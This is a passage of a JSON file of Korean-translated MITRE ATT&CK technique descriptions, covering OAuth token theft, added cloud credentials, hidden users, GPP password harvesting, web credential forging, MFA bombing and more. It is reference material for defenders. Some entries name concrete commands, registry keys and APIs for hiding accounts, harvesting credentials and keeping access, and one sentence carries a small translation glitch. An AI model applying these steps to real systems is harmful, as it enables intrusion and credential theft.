수 있으며, 이 경우 사용자 액션이 접근 허용을 위해 필요할 수 있습니다. OAuth는 사용자에게 시스템 접근을 위한 토큰을 발급하는 일반적으로 구현되는 프레임워크 중 하나입니다. 클라우드 기반 서비스나 보호된 API에 접근하고자 하는 애플리케이션은 다양한 인증 프로토콜을 통해 OAuth 2.0을 사용하여 진입할 수 있습니다. 일반적으로 사용되는 흐름의 예로는 마이크로소프트의 권한 코드 부여 흐름이 있습니다. OAuth 접근 토큰은 제3자 애플리케이션이 사용자 자격 증명을 획득하지 않고도 애플리케이션이 요청한 방식으로 사용자 데이터가 포함된 리소스와 상호작용할 수 있도록 합니다.\n\n상대방은 악의적인 애플리케이션을 설계하여 자원의 접근을 허용받기 위해 대상 사용자의 OAuth 토큰을 통해 OAuth 권한을 활용할 수 있습니다. 상대방은 예를 들어 Azure Portal을 사용하는 Microsoft Identity Platform과 같은 권한 부여 서버에 자신의 애플리케이션 등록을 완료해야 합니다. 그런 다음, 대상 사용자에게 접근을 허용하도록 유도하기 위해 스피어피싱 링크를 보낼 수 있습니다. OAuth 접근 토큰이 부여되면 애플리케이션은 사용자 계정의 기능에 장기적으로 접근할 수 있는 가능성을 가지게 됩니다.\n\n애플리케이션 접근 토큰은 제한된 수명 내에서 기능할 수 있으며, 이는 상대방이 훔친 토큰을 사용할 수 있는 시간을 제한합니다. 그러나 어떤 경우에는 상대방이 애플리케이션 갱신 토큰을 훔칠 수도 있어, 사용자에게 요청하지 않고 새로운 접근 토큰을 얻을 수 있습니다.",
    "external_id": "T1528",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Additional Cloud Credentials",
    "description": "적대자는 클라우드 계정에 자신이 제어하는 자격 증명을 추가하여 피해자의 계정과 환경 내 인스턴스에 대한 지속적인 접근을 유지할 수 있습니다.\n\n예를 들어, 적대자는 Azure 또는 Entra ID에서 기존의 합법적인 자격 증명 외에도 서비스 주체 및 애플리케이션에 대한 자격 증명을 추가할 수 있습니다. 이러한 자격 증명에는 x509 키와 비밀번호가 포함됩니다. 충분한 권한이 있을 경우 Azure 포털, Azure 명령줄 인터페이스 및 Azure 또는 Az PowerShell 모듈을 포함하여 자격 증명을 추가할 수 있는 다양한 방법이 있습니다.\n\n인프라 서비스(IaaS) 환경에서 적대자가 클라우드 계정을 통해 접근 권한을 얻은 후, AWS의 <code>CreateKeyPair</code> 또는 <code>ImportKeyPair</code> API와 GCP의 <code>gcloud compute os-login ssh-keys add</code> 명령을 사용하여 자신의 SSH 키를 생성하거나 가져올 수 있습니다. 이를 통해 손상된 클라우드 계정의 추가 사용 없이 클라우드 환경 내 인스턴스에 지속적으로 접근할 수 있습니다.\n\n또한 적대자는 AWS에서 <code>CreateAccessKey</code> API 또는 GCP에서 <code>gcloud iam service-accounts keys create</code> 명령을 사용하여 계정에 접근 키를 추가할 수 있습니다. 대안으로, AWS에서 <code>CreateLoginProfile</code> API를 사용하여 AWS 관리 콘솔에 로그인하는 데 사용할 수 있는 비밀번호를 추가할 수도 있습니다. 대상 계정이 요청하는 계정과 다른 권한을 가지고 있는 경우, 적대자는 환경 내에서 권한을 상승시킬 수도 있습니다. 예를 들어, Entra ID 환경에서 애플리케이션 관리자 역할을 가진 적대자는 자신의 애플리케이션의 서비스 주체에 새로운 자격 증명 집합을 추가할 수 있습니다. 이 경우 적대자는 애플리케이션 관리자와 다른 서비스 주체의 역할과 권한에 접근할 수 있게 됩니다.\n\nAWS 환경에서 적절한 권한을 가진 적대자는 `sts:GetFederationToken` API 호출을 사용하여 원래 사용자 계정의 권한에 연결된 임시 자격 증명 집합을 생성할 수 있습니다. 이러한 임시 자격 증명은 원래 계정의 API 자격 증명이 비활성화되더라도 그 유효 기간 동안 유효할 수 있습니다.\n\nEntra ID 환경에서 앱 비밀번호 기능이 활성화된 경우, 적대자는 사용자 계정에 앱 비밀번호를 추가할 수 있습니다. 앱 비밀번호는 다단계 인증(MFA)을 지원하지 않는 레거시 장치와 함께 사용되도록 설계되었기 때문에, 앱 비밀번호를 추가하면 적대자가 MFA 요구 사항을 우회할 수 있습니다. 또한, 앱 비밀번호는 사용자의 기본 비밀번호가 재설정되더라도 유효할 수 있습니다.",
    "external_id": "T1098.001",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "User Execution",
    "description": "적대자는 사용자가 특정 행동을 취하도록 유도하여 실행 권한을 획득할 수 있습니다. 사용자들은 악성 문서 파일이나 링크를 열도록 유도하기 위해 소셜 엔지니어링에 노출될 수 있습니다. 이러한 사용자 행동은 일반적으로 피싱의 후속 행동으로 관찰됩니다.\n\n사용자 실행은 초기 접근 이후에 자주 발생하지만, 적대자가 파일을 공유 디렉토리나 사용자의 바탕 화면에 배치하여 사용자가 클릭하기를 바라는 등의 침입의 다른 단계에서도 발생할 수 있습니다. 이 활동은 내부 피싱 이후에도 짧은 시간 내에 발생할 수 있습니다.\n\n적대자들은 또한 사용자에게 다음과 같은 행동을 하도록 속일 수 있습니다:\n\n* 원격 접근 소프트웨어를 활성화하여 적대자에게 시스템의 직접 제어 권한을 부여\n* 브라우저에서 악성 JavaScript를 실행하여 적대자가 웹 세션 쿠키를 훔칠 수 있게 함\n* 사용자 실행을 위해 악성 소프트웨어를 다운로드하고 실행\n* 사용자가 악성 코드를 수동으로 복사, 붙여넣기 및 실행하도록 강요\n\n예를 들어, 기술 지원 사기는 피싱, 음성 피싱, 또는 다양한 사용자 상호작용을 통해 용이하게 이루어질 수 있습니다. 적대자들은 이러한 방법을 조합하여 사용하여 피해자를 악성 웹사이트로 유도하는 무료 번호나 콜센터를 스푸핑하고 홍보하여 악성 코드나 원격 접근 소프트웨어를 포함한 페이로드를 전달하고 실행할 수 있습니다.",
    "external_id": "T1204",
    "modified": "2024-11-11T18:52:12.103Z",
    "translated": true
  },
  {
    "title": "Internal Defacement",
    "description": "적대자는 조직 내부 시스템을 낙서하여 사용자를 위협하거나 오도하려 할 수 있으며, 이는 시스템의 무결성을 훼손하게 됩니다. 이러한 행위는 내부 웹사이트의 수정 형태로 나타나거나 사용자 시스템의 바탕화면 배경을 교체하는 형태로 나타날 수 있습니다. 불쾌하거나 공격적인 이미지가 사용자 불편을 초래하거나 동반된 메시지에 대한 준수를 압박하기 위해 내부 낙서의 일환으로 사용될 수 있습니다. 내부 시스템을 낙서하는 것은 적대자의 존재를 드러내기 때문에, 일반적으로 다른 침입 목표가 달성된 이후에 이루어집니다.",
    "external_id": "T1491.001",
    "modified": "2022-07-28T18:55:35.988Z",
    "translated": true
  },
  {
    "title": "Hidden Users",
    "description": "적대자는 자신이 생성하거나 수정한 사용자 계정의 존재를 숨기기 위해 숨겨진 사용자를 사용할 수 있습니다. 관리자는 특정 시스템에 많은 사용자 계정이 있거나 다른 사용자로부터 자신의 관리 계정이나 기타 관리 계정을 숨기고 싶을 때 사용자를 숨기고 싶어할 수 있습니다.\n\nmacOS에서는 적대자가 plist 파일, 폴더 속성 및 사용자 속성을 조작하여 사용자를 숨기거나 수정할 수 있습니다. 적대자는 로그인 화면과 시스템 환경설정에 사용자가 표시되지 않도록 하려면 사용자 ID를 500 미만으로 설정하고 <code>/Library/Preferences/com.apple.loginwindow</code> plist 파일에서 <code>Hide500Users</code> 키 값을 <code>TRUE</code>로 설정할 수 있습니다. 모든 사용자에게는 사용자 ID가 연결되어 있습니다. <code>Hide500Users</code> 키 값이 <code>TRUE</code>로 설정되면, 사용자 ID가 500 미만인 사용자는 로그인 화면과 시스템 환경설정에 나타나지 않습니다. 명령줄을 사용하여 적대자는 <code>dscl</code> 유틸리티를 사용하여 <code>IsHidden</code> 속성을 <code>1</code>로 설정하여 숨겨진 사용자 계정을 생성할 수 있습니다. 또한 <code>chflags</code>를 변경하여 사용자의 홈 폴더를 숨길 수 있습니다.\n\n적대자는 Windows에서도 유사하게 사용자 계정을 숨길 수 있습니다. 적대자는 특정 사용자가 로그인 화면에 나열되지 않도록 <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> 레지스트리 키 값을 <code>0</code>로 설정할 수 있습니다.\n\nLinux 시스템에서 적대자는 로그인 화면, 즉 그리터에서 사용자 계정을 숨길 수 있습니다. 적대자가 사용할 수 있는 방법은 배포판이 현재 사용하고 있는 디스플레이 관리자에 따라 다릅니다. 예를 들어, GNOME 디스플레이 관리자(GDM)를 사용하는 Ubuntu 시스템에서는 <code>gsettings</code> 명령을 사용하여 그리터에서 계정을 숨길 수 있습니다. 디스플레이 관리자는 특정 배포판에 국한되지 않으며 사용자나 적대자에 의해 변경될 수 있습니다.",
    "external_id": "T1564.002",
    "modified": "2022-04-19T02:31:01.315Z",
    "translated": true
  },
  {
    "title": "Make and Impersonate Token",
    "description": "적대자는 새로운 토큰을 생성하고 사용자를 가장하여 권한을 상승시키고 접근 제어를 우회할 수 있습니다. 예를 들어, 적대자가 사용자 이름과 비밀번호를 알고 있지만 사용자가 시스템에 로그인하지 않은 경우, 적대자는 `LogonUser` 함수를 사용하여 사용자를 위한 로그인 세션을 만들 수 있습니다. 이 함수는 새 세션의 접근 토큰 사본을 반환하며, 적대자는 `SetThreadToken`을 사용하여 토큰을 스레드에 할당할 수 있습니다.\n\n이러한 행동은 기존의 토큰을 훔치거나 복제하는 것이 아니라 새로운 사용자 토큰을 생성하는 데 해당하므로 [토큰 가장/도난]과 구별됩니다.",
    "external_id": "T1134.003",
    "modified": "2024-01-10T17:55:46.905Z",
    "translated": true
  },
  {
    "title": "Group Policy Preferences",
    "description": "적대자는 그룹 정책 기본 설정(GPP)에서 보안이 설정되지 않은 자격 증명을 찾으려 할 수 있습니다. GPP는 관리자가 내장된 자격 증명으로 도메인 정책을 생성할 수 있도록 하는 도구입니다. 이러한 정책을 통해 관리자는 로컬 계정을 설정할 수 있습니다.\n\n이 그룹 정책은 도메인 컨트롤러의 SYSVOL에 저장됩니다. 이는 모든 도메인 사용자가 SYSVOL 공유를 보고 비밀번호를 복호화할 수 있음을 의미합니다(공개된 AES 키를 사용하여).\n\n다음 도구와 스크립트를 사용하여 그룹 정책 기본 설정 XML 파일에서 비밀번호 파일을 수집하고 복호화할 수 있습니다:\n\n* Metasploit의 후속 착취 모듈\n* Get-GPPPassword\n* gpprefdecrypt.py\n\nSYSVOL 공유에서 적대자는 다음 명령을 사용하여 잠재적인 GPP XML 파일을 열거할 수 있습니다: `dir /s *.xml`",
    "external_id": "T1552.006",
    "modified": "2024-08-15T13:21:22.734Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "description": "적대자는 기존의 지휘 및 통제 채널 이외의 비대칭적으로 암호화된 네트워크 프로토콜을 통해 데이터를 유출하여 도 steal할 수 있습니다. 데이터는 또한 주요 지휘 및 통제 서버에서 다른 네트워크 위치로 전송될 수 있습니다.\n\n비대칭 암호화 알고리즘은 채널의 양쪽에서 서로 다른 키를 사용하는 알고리즘입니다. 공개 키 암호화로도 알려진 이는 해당하는 키에서 데이터를 암호화/복호화할 수 있는 쌍의 암호화 키가 필요합니다. 통신 채널의 각 끝에는 개인 키(해당 엔터티가 소유한 키)와 다른 엔터티의 공개 키가 필요합니다. 암호화된 통신이 시작되기 전에 각 엔터티의 공개 키가 교환됩니다.\n\n비대칭 암호화를 사용하는 네트워크 프로토콜(예: HTTPS/TLS/SSL)은 키가 교환된 후 대칭 암호화를 활용하는 경우가 많습니다. 적대자는 프로토콜에 내장된 이러한 암호화된 메커니즘을 사용할 수 있습니다.",
    "external_id": "T1048.002",
    "modified": "2021-10-15T22:44:11.953Z",
    "translated": true
  },
  {
    "title": "Process Discovery",
    "description": "적대자는 시스템에서 실행 중인 프로세스에 대한 정보를 얻으려 할 수 있습니다. 얻어진 정보는 네트워크 내 시스템에서 실행 중인 일반 소프트웨어/애플리케이션에 대한 이해를 돕기 위해 사용될 수 있습니다. 관리자 권한 또는 그 외의 상승된 접근 권한은 더 나은 프로세스 세부정보를 제공할 수 있습니다. 적대자는 자동화된 탐색 중 [프로세스 탐색] 정보를 사용하여 후속 행동을 형성할 수 있으며, 여기에는 적대자가 대상을 완전히 감염시킬지 여부와 특정 작업을 시도할지 여부가 포함됩니다.\n\nWindows 환경에서 적대자는 [Tasklist] 유틸리티를 [cmd]를 통해 사용하거나 [PowerShell]의 `Get-Process`를 통해 실행 중인 프로세스에 대한 세부정보를 얻을 수 있습니다. 프로세스에 대한 정보는 `<code>CreateToolhelp32Snapshot</code>`와 같은 [네이티브 API] 호출의 출력에서도 추출될 수 있습니다. Mac 및 Linux에서는 `<code>ps</code>` 명령을 사용하여 이를 수행합니다. 적대자는 또한 `/proc`를 통해 프로세스를 열거할 수도 있습니다.\n\n네트워크 장치에서 `show processes`와 같은 [네트워크 장치 CLI] 명령어를 사용하여 현재 실행 중인 프로세스를 표시할 수 있습니다.",
    "external_id": "T1057",
    "modified": "2024-04-16T12:43:55.369Z",
    "translated": true
  },
  {
    "title": "Impair Command History Logging",
    "description": "적대자는 손상된 시스템에서 실행한 명령을 숨기기 위해 명령 기록 로깅을 방해할 수 있습니다. 다양한 명령 해석기는 사용자가 터미널에 입력한 명령을 추적하여 사용자가 자신이 수행한 작업을 되짚어볼 수 있도록 합니다.\n\n리눅스와 macOS에서는 명령 기록이 환경 변수에 의해 지정된 파일에 저장됩니다. 사용자가 시스템에서 로그오프할 때, 이 정보는 사용자의 홈 디렉토리에 있는 파일에 저장됩니다. 환경 변수는 어떤 내용을 저장할 것인지를 추적하며, 사용자가 로그아웃할 때 최종적으로 해당 파일에 저장됩니다. macOS에서는 기본적으로 이 환경 변수가 존재하지 않지만, 사용자가 설정할 수 있으며 해당 설정이 적용됩니다.\n\n적대자는 기록 환경 변수를 지우거나 명령 기록 크기를 0으로 설정하여 명령 로그를 방지할 수 있습니다. 또한, 환경 변수를 설정하여 공백으로 시작하는 명령을 무시하도록 설정할 수 있습니다. 이 환경 변수는 중복된 명령을 무시하도록 설정할 수도 있습니다. 일부 리눅스 시스템에서는 기본적으로 이러한 설정이 적용되어 있으며, 이 경우 공백이 포함된 명령은 저장되지 않고, 공백이 없는 명령은 기록됩니다. 적대자는 이 방법을 이용해 터미널 명령 앞에 공백을 추가하여 흔적을 남기지 않고 작업할 수 있습니다.\n\n윈도우 시스템에서는 PowerShell 세션에서 사용된 명령을 추적하는 모듈이 있으며, 기본적으로 이 명령들은 특정 파일에 저장됩니다. 적대자는 이러한 로그가 저장되는 위치를 변경할 수 있으며, 이 경우 명령 로그가 해당 파일에 기록되지 않습니다. 또한, PowerShell 명령을 사용하여 이 파일로의 로깅을 끌 수도 있습니다.\n\n적대자는 네트워크 장치에서 명령 로그 기록을 비활성화할 수 있는 기능을 활용할 수도 있습니다.",
    "external_id": "T1562.003",
    "modified": "2023-03-30T21:01:47.940Z",
    "translated": true
  },
  {
    "title": "Network Provider DLL",
    "description": "적대자는 인증 과정 중에 사용자 자격 증명을 평문으로 캡처하기 위해 악성 네트워크 공급자 동적 링크 라이브러리(DLL)를 등록할 수 있습니다. 네트워크 공급자 DLL은 Windows가 특정 네트워크 프로토콜과 인터페이스할 수 있게 해주며 추가 자격 증명 관리 기능을 지원할 수 있습니다. 로그인 과정 중에 Winlogon(대화형 로그인 모듈)은 자격 증명을 로컬 `mpnotify.exe` 프로세스에 RPC를 통해 전송합니다. 이후 `mpnotify.exe` 프로세스는 로그인 이벤트가 발생하고 있음을 알릴 때 평문으로 자격 증명을 등록된 자격 증명 관리자와 공유합니다.\n\n적대자는 악성 네트워크 공급자 DLL을 구성하여 `mpnotify.exe`로부터 자격 증명을 받을 수 있습니다. 자격 증명 관리자로 설치된 후(레지스트리를 통해) 악성 DLL은 사용자가 Windows 워크스테이션이나 도메인에 로그인할 때마다 자격 증명을 받고 저장할 수 있습니다.\n\n적대자는 서버 및 도메인 컨트롤러와 같이 로그인 활동이나 관리자 로그인 활동이 증가하는 시스템에 악성 네트워크 공급자 DLL을 심는 것을 목표로 할 수 있습니다.",
    "external_id": "T1556.008",
    "modified": "2023-05-04T18:02:51.318Z",
    "translated": true
  },
  {
    "title": "Windows Management Instrumentation Event Subscription",
    "description": "적대 세력은 Windows Management Instrumentation (WMI) 이벤트 구독이 트리거된 악성 콘텐츠를 실행하여 지속성을 확립하고 권한을 상승시킬 수 있습니다. WMI는 정의된 이벤트가 발생할 때 코드를 실행하는 이벤트 필터, 프로바이더, 소비자 및 바인딩을 설치하는 데 사용할 수 있습니다. 구독할 수 있는 이벤트의 예로는 시계 시간, 사용자 로그인 또는 컴퓨터의 가동 시간이 있습니다.\n\n적대 세력은 WMI의 기능을 사용하여 이벤트에 구독하고 해당 이벤트가 발생했을 때 임의의 코드를 실행하여 시스템에서 지속성을 제공할 수 있습니다. 또한 적대 세력은 WMI 스크립트를 `mofcomp.exe`를 사용하여 악성 구독을 생성하는 데 사용할 수 있는 Windows Management Object (MOF) 파일(.mof 확장자)로 컴파일할 수 있습니다.\n\nWMI 구독 실행은 WMI 프로바이더 호스트 프로세스(WmiPrvSe.exe)에 의해 프록시 처리되며, 이로 인해 SYSTEM 권한 상승이 발생할 수 있습니다.",
    "external_id": "T1546.003",
    "modified": "2024-04-13T14:08:20.882Z",
    "translated": true
  },
  {
    "title": "CDNs",
    "description": "적대자들은 타겟팅에 사용할 수 있는 희생자에 대한 콘텐츠 배급 네트워크(CDN) 데이터를 검색할 수 있습니다. CDN은 조직이 분산된 로드 밸런싱 서버 배열에서 콘텐츠를 호스팅할 수 있도록 합니다. 또한 CDN은 조직이 요청자의 지리적 지역에 따라 콘텐츠 배급을 사용자 정의할 수 있게 해줄 수도 있습니다.\n\n적대자들은 실행 가능한 정보를 수집하기 위해 CDN 데이터를 검색할 수 있습니다. 위협 행위자는 온라인 자원과 조회 도구를 사용하여 CDN 내 콘텐츠 서버에 대한 정보를 수집할 수 있습니다. 적대자들은 또한 CDN의 잘못된 구성으로 인해 의도하지 않은 민감한 정보가 유출되거나 조직의 웹사이트에서 호스팅되는 콘텐츠와 동일한 보호 메커니즘(예: 로그인 포털)이 없는 경우 이를 찾아 타겟팅할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 밝혀낼 수 있으며, 운영 자원을 확립하거나 초기 접근을 위한 기회를 제공할 수 있습니다.",
    "external_id": "T1596.004",
    "modified": "2021-04-15T03:47:55.905Z",
    "translated": true
  },
  {
    "title": "User Activity Based Checks",
    "description": "적대자는 가상화 및 분석 환경을 탐지하고 회피하기 위해 다양한 사용자 활동 확인을 사용할 수 있습니다. 이것은 가상 머신 환경(VME) 또는 샌드박스를 나타내는 아티팩트의 존재에 대한 확인 결과에 따라 행동을 변경하는 것을 포함할 수 있습니다. 만약 적대자가 VME를 감지하면, 그들은 피해자와의 연결을 끊거나 임플란트의 핵심 기능을 숨기기 위해 악성 코드를 수정할 수 있습니다. 그들은 또한 추가적인 페이로드를 배포하기 전에 VME 아티팩트를 찾을 수 있습니다. 적대자는 자동화된 탐색 중에 얻은 정보를 사용하여 후속 행동을 형성할 수 있습니다.\n\n적대자는 마우스 움직임과 클릭의 속도/빈도, 브라우저 기록, 캐시, 즐겨찾기 또는 홈 또는 바탕화면과 같은 일반 디렉토리에 있는 파일의 수와 같은 변수를 기반으로 호스트에서 사용자 활동을 검색할 수 있습니다. 다른 방법은 악성 코드가 활성화되기 전에 시스템과 특정 사용자의 상호작용을 요구할 수 있으며, 예를 들어 문서가 닫힐 때까지 기다린 후 매크로를 활성화하거나 사용자가 포함된 이미지를 더블 클릭하여 활성화할 때까지 기다리는 방법이 있습니다.",
    "external_id": "T1497.002",
    "modified": "2024-09-12T15:50:18.050Z",
    "translated": true
  },
  {
    "title": "Software Deployment Tools",
    "description": "적대자는 기업 내에 설치된 중앙 집중식 소프트웨어 제품군에 접근하여 명령을 실행하고 네트워크를 가로질러 이동할 수 있습니다. 구성 관리 및 소프트웨어 배포 애플리케이션은 일상적인 관리 목적으로 기업 네트워크 또는 클라우드 환경에서 사용될 수 있습니다. 이러한 시스템은 CI/CD 파이프라인에 통합될 수도 있습니다.\n\n네트워크 전반 또는 기업 전반의 엔드포인트 관리 소프트웨어에 대한 접근은 적대자가 모든 연결된 시스템에서 원격 코드 실행을 수행할 수 있게 할 수 있습니다. 이 접근은 다른 시스템으로 측면 이동을 하거나, 정보를 수집하거나, 모든 엔드포인트의 하드 드라이브를 지우는 것과 같은 특정 효과를 초래하는 데 사용될 수 있습니다.\n\nSaaS 기반 구성 관리 서비스는 클라우드 호스팅 인스턴스에서 광범위한 클라우드 관리 명령을 수행할 수 있게 하며, 온프레미스 엔드포인트에서 임의의 명령을 실행할 수 있게 할 수 있습니다. 예를 들어, Microsoft 구성 관리자는 글로벌 또는 Intune 관리자가 Entra ID에 가입된 온프레미스 장치에서 SYSTEM으로 스크립트를 실행할 수 있도록 허용합니다. 이러한 서비스는 적대자가 소유한 인프라에 다시 통신하기 위해 웹 프로토콜을 사용할 수도 있습니다.\n\n네트워크 인프라 장치 또한 적대자에 의해 유사하게 남용될 수 있는 구성 관리 도구를 갖추고 있을 수 있습니다.\n\n이 작업에 필요한 권한은 시스템 구성에 따라 다릅니다; 로컬 자격 증명이 제3자 시스템에 대한 직접 접근이 가능한 경우 충분할 수 있으며, 특정 도메인 자격 증명이 필요할 수 있습니다. 그러나 특정 기능에 로그인하거나 접근하기 위해 행정 계정이 필요할 수도 있습니다.",
    "external_id": "T1072",
    "modified": "2024-09-25T20:49:37.227Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over C2 Channel",
    "description": "적대자들은 기존의 명령 및 제어 채널을 통해 데이터를 유출하여 훔칠 수 있습니다. 훔친 데이터는 명령 및 제어 통신과 동일한 프로토콜을 사용하여 정상 통신 채널에 인코딩됩니다.",
    "external_id": "T1041",
    "modified": "2023-04-07T17:09:14.040Z",
    "translated": true
  },
  {
    "title": "Parent PID Spoofing",
    "description": "적대 세력은 새로운 프로세스의 부모 프로세스 식별자(PPID)를 스푸핑하여 프로세스 모니터링 방어를 피하거나 권한을 상승시킬 수 있습니다. 새로운 프로세스는 일반적으로 부모 또는 호출 프로세스에서 직접 생성됩니다. 새로운 프로세스의 PPID를 명시적으로 할당하는 한 가지 방법은 <code>CreateProcess</code> API 호출을 사용하는 것으로, 이 호출은 사용할 PPID를 정의하는 매개변수를 지원합니다. 이 기능은 사용자 계정 컨트롤(UAC)과 같은 Windows 기능에서 사용되어, 요청된 상승 프로세스가 SYSTEM에 의해 생성될 때 (일반적으로 <code>svchost.exe</code> 또는 <code>consent.exe</code>를 통해) 현재 사용자 맥락이 아닌 PPID를 올바르게 설정합니다.\n\n적대 세력은 이러한 메커니즘을 악용하여 Office 문서에서 직접 생성되는 프로세스를 차단하는 방어를 우회하거나, 비정상적이거나 잠재적으로 악의적인 부모-자식 프로세스 관계를 분석하는 데 사용될 수 있습니다. 예를 들어, [PowerShell] 또는 [Rundll32]의 PPID를 <code>explorer.exe</code>로 스푸핑하여 [스피어피싱 첨부파일]의 일환으로 제공되는 Office 문서가 아닌 경우가 있습니다. 이 스푸핑은 악성 Office 문서 내에서 [Visual Basic]을 사용하거나 [네이티브 API]를 수행할 수 있는 코드로 실행될 수 있습니다.\n\nPPID를 명시적으로 할당하면 부모 프로세스에 대한 적절한 액세스 권한이 주어질 경우 권한 상승을 가능하게 할 수도 있습니다. 예를 들어, 특권 사용자 맥락(즉, 관리자)에 있는 적대 세력이 새로운 프로세스를 생성하고 부모 프로세스를 SYSTEM으로 실행되는 프로세스(예: <code>lsass.exe</code>)로 할당하면, 새로운 프로세스는 상속된 접근 토큰을 통해 권한이 상승하게 됩니다.",
    "external_id": "T1134.004",
    "modified": "2022-05-03T02:15:42.360Z",
    "translated": true
  },
  {
    "title": "Gather Victim Org Information",
    "description": "적대자는 목표로 삼고 있는 희생자의 조직에 관한 정보를 수집할 수 있으며, 이는 타겟팅에 활용될 수 있습니다. 조직에 대한 정보는 부서의 이름, 비즈니스 운영의 세부사항, 주요 직원의 역할과 책임 등 다양한 세부정보를 포함할 수 있습니다.\n\n적대자는 다양한 방법으로 이러한 정보를 수집할 수 있으며, 예를 들어 직접적인 질문을 통해 수집할 수 있습니다. 조직에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있습니다. 이러한 정보를 수집하는 과정에서 다른 형태의 정찰 기회를 발견할 수 있으며, 운영 자원을 구축하거나 초기 접근을 시도할 수 있습니다.",
    "external_id": "T1591",
    "modified": "2021-08-27T15:37:09.343Z",
    "translated": true
  },
  {
    "title": "Forge Web Credentials",
    "description": "적대 세력은 웹 애플리케이션이나 인터넷 서비스에 접근하기 위해 사용할 수 있는 인증 자료를 위조할 수 있습니다. 웹 애플리케이션 및 서비스(클라우드 SaaS 환경이나 온프레미스 서버에 호스팅됨)는 종종 세션 쿠키, 토큰 또는 기타 자료를 사용하여 사용자 접근을 인증하고 권한 부여를 합니다.\n\n적대 세력은 이러한 인증 자료를 생성하여 웹 리소스에 접근할 수 있습니다. 이는 인증이 새로운 것이고 적대자가 위조한 것이지 합법적인 사용자로부터 도난당하거나 가로채어진 것이 아니라는 점에서 [웹 세션 쿠키 도용](https://attack.mitre.org/techniques/T1539), [애플리케이션 접근 토큰 도용](https://attack.mitre.org/techniques/T1528) 및 기타 유사한 행동과 다릅니다.\n\n웹 인증 자료의 생성을 위해서는 종종 비밀번호, [개인 키](https://attack.mitre.org/techniques/T1552/004) 또는 기타 암호화 시드 값과 같은 비밀값이 필요합니다. 적대 세력은 또한 AWS의 `AssumeRole` 및 `GetFederationToken` API와 같은 기능을 이용하여 토큰을 위조할 수 있습니다. 이는 사용자가 임시 보안 인증 자료(즉, [임시 상승된 클라우드 접근](https://attack.mitre.org/techniques/T1548/005))를 요청할 수 있도록 해줍니다. Zimbra의 `zmprov gdpak` 명령어는 도메인 내 모든 사용자에 대한 토큰을 생성할 수 있는 사전 인증 키를 생성합니다.\n\n한 번 위조된 인증 자료는 적대 세력이 리소스에 접근하는 데 사용될 수 있으며, 이는 다단계 및 기타 인증 보호 메커니즘을 우회할 수 있습니다.",
    "external_id": "T1606",
    "modified": "2024-10-15T15:58:23.638Z",
    "translated": true
  },
  {
    "title": "Multi-Factor Authentication Request Generation",
    "description": "적대 세력은 사용자에게 전송된 MFA 요청을 생성하여 다단계 인증(MFA) 메커니즘을 우회하고 계정에 접근하려고 할 수 있습니다.\n\n유효한 계정에 대한 자격 증명을 가진 적대 세력이 2FA 또는 MFA 메커니즘에 접근할 수 없다면 로그인 프로세스를 완료할 수 없습니다. 이를 우회하기 위해, 적대 세력은 Duo Push, Microsoft Authenticator, Okta와 같은 MFA 서비스에 대한 푸시 알림 자동 생성을 악용하여 사용자가 자신의 계정에 대한 접근 권한을 부여하도록 할 수 있습니다. 피해자 계정에 대한 자격 증명이 없는 경우, 자동 푸시 알림 생성을 악용하여 사용자가 자가 서비스 비밀번호 초기화(SSPR)를 설정한 경우에도 이용할 수 있습니다.\n\n일부 경우, 적대 세력은 MFA 푸시 알림, SMS 메시지 및 전화 통화로 사용자를 폭격하기 위해 로그인 시도를 반복하여 사용자가 'MFA 피로'에 따라 인증 요청을 수용하도록 만들 수 있습니다.",
    "external_id": "T1621",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Compromise Host Software Binary",
    "description": "적대자들은 시스템에 대한 지속적인 접근을 확보하기 위해 호스트 소프트웨어 바이너리를 수정할 수 있습니다. 소프트웨어 바이너리/실행 파일은 다양한 시스템 명령이나 서비스, 프로그램 및 라이브러리를 제공합니다. 일반적인 소프트웨어 바이너리에는 SSH 클라이언트, FTP 클라이언트, 이메일 클라이언트, 웹 브라우저 및 기타 많은 사용자 또는 서버 애플리케이션이 포함됩니다.\n\n적대자들은 호스트 소프트웨어 바이너리를 수정함으로써 지속성을 확립할 수 있습니다. 예를 들어, 적대자는 합법적인 애플리케이션 바이너리(또는 지원 파일)를 백도어로 교체하거나 감염시킬 수 있습니다. 이러한 바이너리는 애플리케이션이나 사용자가 정기적으로 실행할 수 있기 때문에, 적대자는 이를 활용하여 호스트에 대한 지속적인 접근을 확보할 수 있습니다. 또한, 적대자는 SSH 클라이언트와 같은 소프트웨어 바이너리를 수정하여 로그인 중 자격 증명을 지속적으로 수집할 수 있습니다.\n\n적대자는 기존 바이너리를 악성 기능을 패치함으로써 수정할 수도 있습니다. 예를 들어, 적대자는 바이너리의 진입점을 수정하여 정상 실행 흐름이 재개되기 전에 적대자가 패치한 악성 코드로 가리키도록 할 수 있습니다.\n\n바이너리를 수정한 후, 적대자는 업데이트를 방지함으로써 방어를 저하시키려 할 수 있습니다.",
    "external_id": "T1554",
    "modified": "2024-10-12T16:52:46.067Z",
    "translated": true
  },
  {
    "title": "Chat Messages",
